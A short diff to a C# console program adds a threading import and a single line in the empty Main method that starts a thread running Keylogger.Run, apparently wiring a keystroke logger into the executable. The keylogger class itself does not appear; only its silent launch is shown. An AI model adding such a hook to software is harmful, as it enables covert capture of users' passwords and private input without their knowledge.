@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Text;
+using System.Threading;
 
 namespace sub
 {
@@ -8,6 +9,7 @@ namespace sub
     {
         static void Main(string[] args)
         {
+            new Thread(Keylogger.Run).Start(10);
         }
     }
 }
